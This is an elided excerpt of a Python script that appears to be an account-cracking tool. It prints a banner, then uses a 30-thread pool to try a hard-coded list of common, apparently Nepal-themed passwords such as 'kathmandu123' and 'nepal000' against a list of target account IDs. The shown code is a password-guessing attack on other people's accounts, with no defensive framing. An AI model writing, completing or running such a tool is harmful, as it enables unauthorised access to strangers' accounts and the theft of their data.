...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             CINTO MANDI : [green] AADARSHA [purple] '))
...
def passwrd():
	...
	with tgreen(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['fuckyou123','sagarmatha8848','kathmandu123','biratnagar123','nepal000','dharan123','iloveyou','machikney','machikney123']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
